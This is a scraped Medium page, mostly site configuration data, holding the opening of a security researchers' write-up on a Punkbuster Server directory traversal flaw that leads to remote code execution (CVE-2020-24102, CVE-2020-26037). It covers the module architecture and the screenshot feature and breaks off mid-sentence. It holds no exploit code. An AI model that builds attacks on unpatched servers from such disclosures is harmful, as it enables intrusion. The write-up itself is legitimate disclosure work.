href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----e22e6cf2f36e--------------------------------" rel="noopener follow"><p class="bf b dv z du">Privacy</p></a></div><div class="te tf l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----e22e6cf2f36e--------------------------------" rel="noopener follow"><p class="bf b dv z du">Terms</p></a></div><div class="te tf l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://speechify.com/medium?source=post_page-----e22e6cf2f36e--------------------------------" rel="noopener follow"><p class="bf b dv z du">Text to speech</p></a></div><div class="te l"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" rel="noopener follow" href="/business?source=post_page-----e22e6cf2f36e--------------------------------"><p class="bf b dv z du">Teams</p></a></div></div></div></div></div></div></div></div></div></div><script>window.__BUILD_ID__="main-20250110-154215-d58a2d1ab2"</script><script>window.__GRAPHQL_URI__ = "https://medium.com/_/graphql"</script><script>window.__PRELOADED_STATE__ = {"algolia":{"queries":{}},"cache":{"experimentGroupSet":true,"reason":"","group":"enabled","tags":["group-edgeCachePosts","post-e22e6cf2f36e","user-6accd23011ad"],"serverVariantState":"44136fa355b3678a1146ad16f7e8649e94fb4fc21fe77e8310c060f61caaff8a","middlewareEnabled":true,"cacheStatus":"DYNAMIC","shouldUseCache":true,"vary":[],"lohpSummerUpsellEnabled":false},"client":{"hydrated":false,"isUs":false,"isNativeMedium":false,"isSafariMobile":false,"isSafari":false,"isFirefox":false,"routingEntity":{"type":"DEFAULT","explicit":false},"viewerIsBot":false},"debug":{"requestId":"18d427a2-1f4a-4bab-95b5-8cfafc2a2506","requestTag":"","hybridDevServices":[],"originalSpanCarrier":{"traceparent":"00-12ab432bc140e609a187dcc70d02378d-d43b7dc6b91d7f99-01"}},"multiVote":{"clapsPerPost":{}},"navigation":{"branch":{"show":null,"hasRendered":null,"blockedByCTA":false},"hideGoogleOneTap":false,"hasRenderedAlternateUserBanner":null,"currentLocation":"https:\u002F\u002Fmedium.com\u002F@prizmant\u002Fhacking-punkbuster-e22e6cf2f36e","host":"medium.com","hostname":"medium.com","referrer":"","hasSetReferrer":false,"susiModal":{"step":null,"operation":"register"},"postRead":false,"partnerProgram":{"selectedCountryCode":null},"queryString":"","currentHash":""},"config":{"nodeEnv":"production","version":"main-20250110-154215-d58a2d1ab2","target":"production","productName":"Medium","publicUrl":"https:\u002F\u002Fcdn-client.medium.com\u002Flite","authDomain":"medium.com","authGoogleClientId":"216296035834-k1k6qe060s2tp2a2jam4ljdcms00sttg.apps.googleusercontent.com","favicon":"production","glyphUrl":"https:\u002F\u002Fglyph.medium.com","branchKey":"key_live_ofxXr2qTrrU9NqURK8ZwEhknBxiI6KBm","algolia":{"appId":"MQ57UUUQZ2","apiKeySearch":"394474ced050e3911ae2249ecc774921","indexPrefix":"medium_","host":"-dsn.algolia.net"},"recaptchaKey":"6Lfc37IUAAAAAKGGtC6rLS13R1Hrw_BqADfS1LRk","recaptcha3Key":"6Lf8R9wUAAAAABMI_85Wb8melS7Zj6ziuf99Yot5","recaptchaEnterpriseKeyId":"6Le-uGgpAAAAAPprRaokM8AKthQ9KNGdoxaGUvVp","datadog":{"applicationId":"6702d87d-a7e0-42fe-bbcb-95b469547ea0","clientToken":"pub853ea8d17ad6821d9f8f11861d23dfed","rumToken":"pubf9cc52896502b9413b68ba36fc0c7162","context":{"deployment":{"target":"production","tag":"main-20250110-154215-d58a2d1ab2","commit":"d58a2d1ab2df37007c05f758ad444c4fe1e39591"}},"datacenter":"us"},"googleAnalyticsCode":"G-7JY7T788PK","googlePay":{"apiVersion":"2","apiVersionMinor":"0","merchantId":"BCR2DN6TV7EMTGBM","merchantName":"Medium","instanceMerchantId":"13685562959212738550"},"applePay":{"version":3},"signInWallCustomDomainCollectionIds":["3a8144eabfe3","336d898217ee","61061eb0c96b","138adf9c44c","819cc2aaeee0"],"mediumMastodonDomainName":"me.dm","mediumOwnedAndOperatedCollectionIds":["8a9336e5bb4","b7e45b22fec3","193b68bd4fba","8d6b8a439e32","54c98c43354d","3f6ecf56618","d944778ce714","92d2092dc598","ae2a65f35510","1285ba81cada","544c7006046e","fc8964313712","40187e704f1c","88d9857e584e","7b6769f2748b","bcc38c8f6edf","cef6983b292","cb8577c9149e","444d13b52878","713d7dbc99b0","ef8e90590e66","191186aaafa0","55760f21cdc5","9dc80918cc93","bdc4052bbdba","8ccfed20cbb2"],"tierOneDomains":["medium.com","thebolditalic.com","arcdigital.media","towardsdatascience.com","uxdesign.cc","codeburst.io","psiloveyou.xyz","writingcooperative.com","entrepreneurshandbook.co","prototypr.io","betterhumans.coach.me","theascent.pub"],"topicsToFollow":["d61cf867d93f","8a146bc21b28","1eca0103fff3","4d562ee63426","aef1078a3ef5","e15e46793f8d","6158eb913466","55f1c20aba7a","3d18b94f6858","4861fee224fd","63c6f1f93ee","1d98b3a9a871","decb52b64abf","ae5d4995e225","830cded25262"],"topicToTagMappings":{"accessibility":"accessibility","addiction":"addiction","android-development":"android-development","art":"art","artificial-intelligence":"artificial-intelligence","astrology":"astrology","basic-income":"basic-income","beauty":"beauty","biotech":"biotech","blockchain":"blockchain","books":"books","business":"business","cannabis":"cannabis","cities":"cities","climate-change":"climate-change","comics":"comics","coronavirus":"coronavirus","creativity":"creativity","cryptocurrency":"cryptocurrency","culture":"culture","cybersecurity":"cybersecurity","data-science":"data-science","design":"design","digital-life":"digital-life","disability":"disability","economy":"economy","education":"education","equality":"equality","family":"family","feminism":"feminism","fiction":"fiction","film":"film","fitness":"fitness","food":"food","freelancing":"freelancing","future":"future","gadgets":"gadgets","gaming":"gaming","gun-control":"gun-control","health":"health","history":"history","humor":"humor","immigration":"immigration","ios-development":"ios-development","javascript":"javascript","justice":"justice","language":"language","leadership":"leadership","lgbtqia":"lgbtqia","lifestyle":"lifestyle","machine-learning":"machine-learning","makers":"makers","marketing":"marketing","math":"math","media":"media","mental-health":"mental-health","mindfulness":"mindfulness","money":"money","music":"music","neuroscience":"neuroscience","nonfiction":"nonfiction","outdoors":"outdoors","parenting":"parenting","pets":"pets","philosophy":"philosophy","photography":"photography","podcasts":"podcast","poetry":"poetry","politics":"politics","privacy":"privacy","product-management":"product-management","productivity":"productivity","programming":"programming","psychedelics":"psychedelics","psychology":"psychology","race":"race","relationships":"relationships","religion":"religion","remote-work":"remote-work","san-francisco":"san-francisco","science":"science","self":"self","self-driving-cars":"self-driving-cars","sexuality":"sexuality","social-media":"social-media","society":"society","software-engineering":"software-engineering","space":"space","spirituality":"spirituality","sports":"sports","startups":"startup","style":"style","technology":"technology","transportation":"transportation","travel":"travel","true-crime":"true-crime","tv":"tv","ux":"ux","venture-capital":"venture-capital","visual-design":"visual-design","work":"work","world":"world","writing":"writing"},"defaultImages":{"avatar":{"imageId":"1*dmbNkD5D-u45r44go_cf0g.png","height":150,"width":150},"orgLogo":{"imageId":"7*V1_7XP4snlmqrc_0Njontw.png","height":110,"width":500},"postLogo":{"imageId":"bd978bb536350a710e8efb012513429cabdc4c28700604261aeda246d0f980b7","height":810,"width":1440},"postPreviewImage":{"imageId":"1*hn4v1tCaJy7cWMyb0bpNpQ.png","height":386,"width":579}},"collectionStructuredData":{"8d6b8a439e32":{"name":"Elemental","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F980\u002F1*9ygdqoKprhwuTVKUM0DLPA@2x.png","width":980,"height":159}}},"3f6ecf56618":{"name":"Forge","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F596\u002F1*uULpIlImcO5TDuBZ6lm7Lg@2x.png","width":596,"height":183}}},"ae2a65f35510":{"name":"GEN","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F264\u002F1*RdVZMdvfV3YiZTw6mX7yWA.png","width":264,"height":140}}},"88d9857e584e":{"name":"LEVEL","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*JqYMhNX6KNNb2UlqGqO2WQ.png","width":540,"height":108}}},"7b6769f2748b":{"name":"Marker","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F383\u002F1*haCUs0wF6TgOOvfoY-jEoQ@2x.png","width":383,"height":92}}},"444d13b52878":{"name":"OneZero","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*cw32fIqCbRWzwJaoQw6BUg.png","width":540,"height":123}}},"8ccfed20cbb2":{"name":"Zora","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*tZUQqRcCCZDXjjiZ4bDvgQ.png","width":540,"height":106}}}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID_APPLICABLE_TAG_SLUGS":[],"COVID_APPLICABLE_TOPIC_NAMES":[],"COVID_APPLICABLE_TOPIC_NAMES_FOR_TOPIC_PAGE":[],"COVID_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":66,"end":73,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":[{"start":37,"end":45,"href":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Fcategories\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":56,"end":70,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":138,"end":145,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":45,"end":59,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":127,"end":134,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]}},"COVID_BANNER_POST_ID_OVERRIDE_WHITELIST":["3b31a67bff4a"]},"sharedVoteMessaging":{"TAGS":["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"],"TOPICS":["politics","election"],"MESSAGE":{"text":"Find out more about the U.S. election results here.","markups":[{"start":46,"end":50,"href":"https:\u002F\u002Fcookpolitical.com\u002F2020-national-popular-vote-tracker"}]},"EXCLUDE_POSTS":["397ef29e3ca5"]},"embedPostRules":[],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production_zjkj96jm_m56f8fqpf7ngnrd4","braintree":{"enabled":true,"merchantId":"m56f8fqpf7ngnrd4","merchantAccountId":{"usd":"AMediumCorporation_instant","eur":"amediumcorporation_EUR","cad":"amediumcorporation_CAD"},"publicKey":"ds2nn34bg2z7j5gd","braintreeEnvironment":"production","dashboardUrl":"https:\u002F\u002Fwww.braintreegateway.com\u002Fmerchants","gracePeriodDurationInDays":14,"mediumMembershipPlanId":{"monthly":"ce105f8c57a3","monthlyV2":"e8a5e126-792b-4ee6-8fba-d574c1b02fc5","monthlyWithTrial":"d5ee3dbe3db8","monthlyPremium":"fa741a9b47a2","yearly":"a40ad4a43185","yearlyV2":"3815d7d6-b8ca-4224-9b8c-182f9047866e","yearlyStaff":"d74fb811198a","yearlyWithTrial":"b3bc7350e5c7","yearlyPremium":"e21bd2c12166","monthlyOneYearFree":"e6c0637a-2bad-4171-ab4f-3c268633d83c","monthly25PercentOffFirstYear":"235ecc62-0cdb-49ae-9378-726cd21c504b","monthly20PercentOffFirstYear":"ba518864-9c13-4a99-91ca-411bf0cac756","monthly15PercentOffFirstYear":"594c029b-9f89-43d5-88f8-8173af4e070e","monthly10PercentOffFirstYear":"c6c7bc9a-40f2-4b51-8126-e28511d5bdb0","monthlyForStudents":"629ebe51-da7d-41fd-8293-34cd2f2030a8","yearlyOneYearFree":"78ba7be9-0d9f-4ece-aa3e-b54b826f2bf1","yearly25PercentOffFirstYear":"2dbb010d-bb8f-4eeb-ad5c-a08509f42d34","yearly20PercentOffFirstYear":"47565488-435b-47f8-bf93-40d5fbe0ebc8","yearly15PercentOffFirstYear":"8259809b-0881-47d9-acf7-6c001c7f720f","yearly10PercentOffFirstYear":"9dd694fb-96e1-472c-8d9e-3c868d5c1506","yearlyForStudents":"e29345ef-ab1c-4234-95c5-70e50fe6bc23","monthlyCad":"p52orjkaceei","yearlyCad":"h4q9g2up9ktt"},"braintreeDiscountId":{"oneMonthFree":"MONTHS_FREE_01","threeMonthsFree":"MONTHS_FREE_03","sixMonthsFree":"MONTHS_FREE_06","fiftyPercentOffOneYear":"FIFTY_PERCENT_OFF_ONE_YEAR"},"3DSecureVersion":"2","defaultCurrency":"usd","providerPlanIdCurrency":{"4ycw":"usd","rz3b":"usd","3kqm":"usd","jzw6":"usd","c2q2":"usd","nnsw":"usd","q8qw":"usd","d9y6":"usd","fx7w":"cad","nwf2":"cad"}},"paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig_amnhvlMVX87otaq58niAg9iuLktVNF_1WCMnN7v","paypal":{"host":"https:\u002F\u002Fapi.paypal.com:443","clientMode":"production","serverMode":"live","webhookId":"4G466076A0294510S","monthlyPlan":{"planId":"P-9WR0658853113943TMU5FDQA","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlan":{"planId":"P-7N8963881P8875835MU5JOPQ","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oneYearGift":{"name":"Medium Membership (1 Year, Digital Gift Code)","description":"Unlimited access to the best and brightest stories on Medium. Gift codes can be redeemed at medium.com\u002Fredeem.","price":"50.00","currency":"USD","sku":"membership-gift-1-yr"},"oldMonthlyPlan":{"planId":"P-96U02458LM656772MJZUVH2Y","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlan":{"planId":"P-59P80963JF186412JJZU3SMI","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"monthlyPlanWithTrial":{"planId":"P-66C21969LR178604GJPVKUKY","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlanWithTrial":{"planId":"P-6XW32684EX226940VKCT2MFA","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oldMonthlyPlanNoSetupFee":{"planId":"P-4N046520HR188054PCJC7LJI","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlanNoSetupFee":{"planId":"P-7A4913502Y5181304CJEJMXQ","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"sdkUrl":"https:\u002F\u002Fwww.paypal.com\u002Fsdk\u002Fjs"},"stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl","log":{"json":true,"level":"info"},"imageUploadMaxSizeMb":25,"staffPicks":{"title":"Staff Picks","catalogId":"c7bc6e1ee00f"}},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ROOT_QUERY":{"__typename":"Query","viewer":null,"collectionByDomainOrSlug({\"domainOrSlug\":\"medium.com\"})":null,"postResult({\"id\":\"e22e6cf2f36e\"})":{"__ref":"Post:e22e6cf2f36e"}},"LinkedAccounts:6accd23011ad":{"__typename":"LinkedAccounts","mastodon":null,"id":"6accd23011ad"},"User:6accd23011ad":{"__typename":"User","id":"6accd23011ad","linkedAccounts":{"__ref":"LinkedAccounts:6accd23011ad"},"isSuspended":false,"name":"Daniel Prizmant","imageId":"0*A_LwwCYAwlc0mu4V.jpg","customDomainState":null,"hasSubdomain":false,"username":"prizmant","verifications":{"__typename":"VerifiedInfo","isBookAuthor":false},"socialStats":{"__typename":"SocialStats","followerCount":4,"followingCount":1,"collectionFollowingCount":0},"bio":"","membership":null,"allowNotes":true,"viewerEdge":{"__ref":"UserViewerEdge:userId:6accd23011ad-viewerId:lo_2246cba9c8b2"},"twitterScreenName":""},"Paragraph:5b1d91643f0b_0":{"__typename":"Paragraph","id":"5b1d91643f0b_0","name":"57ca","type":"H3","href":null,"layout":null,"metadata":null,"text":"Hacking Punkbuster","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_1":{"__typename":"Paragraph","id":"5b1d91643f0b_1","name":"b65c","type":"H3","href":null,"layout":null,"metadata":null,"text":"A Directory Traversal Attack on Punkbuster Server can be Leveraged to Gain Remote Code Execution (CVE-2020–24102, CVE-2020–26037)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*9CiLrQCxtufYQW0TU8O4aA.png":{"__typename":"ImageMetadata","id":"1*9CiLrQCxtufYQW0TU8O4aA.png","originalHeight":417,"originalWidth":1120,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:5b1d91643f0b_2":{"__typename":"Paragraph","id":"5b1d91643f0b_2","name":"6e37","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*9CiLrQCxtufYQW0TU8O4aA.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_3":{"__typename":"Paragraph","id":"5b1d91643f0b_3","name":"fd9d","type":"H3","href":null,"layout":null,"metadata":null,"text":"Who We Are","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_4":{"__typename":"Paragraph","id":"5b1d91643f0b_4","name":"8d95","type":"P","href":null,"layout":null,"metadata":null,"text":"We are two gamers that love the Battlefield series and also happened to like reverse engineering projects.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":32,"end":43,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_5":{"__typename":"Paragraph","id":"5b1d91643f0b_5","name":"d744","type":"P","href":null,"layout":null,"metadata":null,"text":"Daniel Prizmant — A senior security researcher at Palo Alto Networks who loves video games reverse engineering— https:\u002F\u002Fwww.linkedin.com\u002Fin\u002Fprizmant\u002F — https:\u002F\u002Ftwitter.com\u002Fprizdan","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":112,"end":149,"href":"https:\u002F\u002Fwww.linkedin.com\u002Fin\u002Fprizmant\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"A","start":152,"end":179,"href":"https:\u002F\u002Ftwitter.com\u002Fprizdan","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_6":{"__typename":"Paragraph","id":"5b1d91643f0b_6","name":"151c","type":"P","href":null,"layout":null,"metadata":null,"text":"Mauricio Sandt — Second semester CS student doing low level programming and reverse engineering as a hobby — https:\u002F\u002Fwww.linkedin.com\u002Fin\u002Fmauriciosandt\u002F","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":109,"end":151,"href":"https:\u002F\u002Fwww.linkedin.com\u002Fin\u002Fmauriciosandt\u002F","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_7":{"__typename":"Paragraph","id":"5b1d91643f0b_7","name":"af14","type":"H3","href":null,"layout":null,"metadata":null,"text":"Some Background","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_8":{"__typename":"Paragraph","id":"5b1d91643f0b_8","name":"65f1","type":"P","href":null,"layout":null,"metadata":null,"text":"Back in the day, before kernel-driver-backed anti cheats, Punkbuster was the gold standard in the industry. Punkbuster was revolutionary and introduced many new techniques to fight cheaters. It was a very long time ago, but back then all the big titles, like Battlefield 2 and Call of Duty: Modern Warfare were using Punkbuster as their go-to anti cheat. Sadly, Punkbuster didn’t manage to keep up with the industry and it has been years since a new online game chose to use its services (the last game to use it was Battlefield Hardline released in March 2015).","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":446,"end":449,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":259,"end":272,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":277,"end":305,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":517,"end":537,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_9":{"__typename":"Paragraph","id":"5b1d91643f0b_9","name":"d731","type":"H3","href":null,"layout":null,"metadata":null,"text":"How did We Get Here?","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_10":{"__typename":"Paragraph","id":"5b1d91643f0b_10","name":"e71d","type":"P","href":null,"layout":null,"metadata":null,"text":"Recently we started playing Battlefield 4 again, and were surprised to find out there are still many active servers, almost 1000 servers in total with 50,000 unique daily players, and most of them are Punkbuster protected.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"EM","start":28,"end":41,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_11":{"__typename":"Paragraph","id":"5b1d91643f0b_11","name":"7d4a","type":"P","href":null,"layout":null,"metadata":null,"text":"We thought it would be a cool side project to take a look at the internals of Punkbuster and fundamentally understand how it works, so we did.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_12":{"__typename":"Paragraph","id":"5b1d91643f0b_12","name":"f95f","type":"P","href":null,"layout":null,"metadata":null,"text":"For security reasons we will only give a high level description of the vulnerability and won’t dive deep into the actual reverse engineering process.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_13":{"__typename":"Paragraph","id":"5b1d91643f0b_13","name":"2211","type":"P","href":null,"layout":null,"metadata":null,"text":"We won’t share a working exploit either as there are still some servers that didn’t update yet.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_14":{"__typename":"Paragraph","id":"5b1d91643f0b_14","name":"f9ae","type":"H3","href":null,"layout":null,"metadata":null,"text":"Client Server Architecture","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_15":{"__typename":"Paragraph","id":"5b1d91643f0b_15","name":"1117","type":"P","href":null,"layout":null,"metadata":null,"text":"Both client and server side of Punkbuster work as modules. Both load the main Punkbuster module which just exports two functions:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_16":{"__typename":"Paragraph","id":"5b1d91643f0b_16","name":"d5b8","type":"ULI","href":null,"layout":null,"metadata":null,"text":"ca and cb for the client","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":0,"end":2,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":7,"end":9,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_17":{"__typename":"Paragraph","id":"5b1d91643f0b_17","name":"3d83","type":"ULI","href":null,"layout":null,"metadata":null,"text":"sa and sb for the server","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":0,"end":2,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":7,"end":9,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_18":{"__typename":"Paragraph","id":"5b1d91643f0b_18","name":"f60f","type":"P","href":null,"layout":null,"metadata":null,"text":"Those two functions handle all the Punkbuster events for both sides. Event messages are encoded and decoded twice, once by Punkbuster itself (not dependent on the game) and once by the game itself.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_19":{"__typename":"Paragraph","id":"5b1d91643f0b_19","name":"e7ec","type":"P","href":null,"layout":null,"metadata":null,"text":"For example, when a Punkbuster client sends a new message to the server it encodes it, then passes it to the game client which encodes it too as part of the game encoding. Eventually the message is received at the game server which decodes it and passes it to the Punkbuster module which decodes it using the Punkbuster algorithm.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:0*Bohhdw9dmZKA4Cjc":{"__typename":"ImageMetadata","id":"0*Bohhdw9dmZKA4Cjc","originalHeight":286,"originalWidth":1014,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:5b1d91643f0b_20":{"__typename":"Paragraph","id":"5b1d91643f0b_20","name":"9ebc","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:0*Bohhdw9dmZKA4Cjc"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_21":{"__typename":"Paragraph","id":"5b1d91643f0b_21","name":"23ee","type":"P","href":null,"layout":null,"metadata":null,"text":"This means that using tools like Wireshark to tap the communication won’t get you far as all the Punkbuster communication is encoded twice. Note that RCON commands are not encoded and received in the server as plain text.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_22":{"__typename":"Paragraph","id":"5b1d91643f0b_22","name":"f449","type":"H3","href":null,"layout":null,"metadata":null,"text":"The Screenshots Mechanism","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_23":{"__typename":"Paragraph","id":"5b1d91643f0b_23","name":"3801","type":"P","href":null,"layout":null,"metadata":null,"text":"One of Punkbuster’s features is the capability of requesting a screenshot from the game clients. The official description of the feature is the following:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_24":{"__typename":"Paragraph","id":"5b1d91643f0b_24","name":"8249","type":"PRE","href":null,"layout":null,"metadata":null,"text":"The PunkBuster Screen Capture Facility allows Server Admins to request actual screenshots from players’ screens while they are playing. The screenshots are transferred over the network and saved by the Server Admins either for private use or possibly for publication to a website.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:5b1d91643f0b_25":{"__typename":"Paragraph","id":"5b1d91643f0b_25","name":"0142","type":"P","href":null,"layout":null,"metadata":null,"text":"So, basically, admins can ask clients to send their screenshots to the server for observation. This can also be scheduled so each client will be requested a screenshot each x amount of 